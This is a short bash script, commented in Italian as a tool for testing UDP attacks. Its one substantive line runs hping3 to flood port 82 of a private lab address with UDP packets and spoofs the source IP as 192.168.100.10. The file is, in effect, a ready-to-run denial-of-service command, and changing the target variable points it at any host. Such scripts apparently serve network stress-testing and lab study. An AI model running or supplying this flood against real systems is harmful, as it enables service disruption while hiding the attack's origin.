#!/bin/bash

# Script per testare attacchi UDP con hping3

TARGET_IP="192.168.56.10"  # Sostituisci con l'IP di destinazione

sudo hping3 --udp --flood -p 82 --spoof 192.168.100.10 $TARGET_IP



echo "[+] Test completato!"
